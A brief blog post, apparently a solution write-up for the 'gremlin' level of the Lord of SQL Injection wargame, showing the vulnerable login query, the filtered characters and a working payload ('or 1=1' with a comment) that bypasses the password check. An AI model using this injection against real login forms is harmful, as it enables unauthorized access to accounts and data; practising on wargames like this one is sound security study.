---
title: "[LOS] gremlin"
date: 2025-03-20 00:00:00
categories: [Wargame, Lord of SQL Injection]
tags: [webhacking, sqli]
published: True
---

# Query

```sql
select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
```

<br>

# preg_match

- `prob` 문자열
- `_`
- `.`
- `()`

<br>

# Payload

```
?id=asd' or 1=1 %23
```
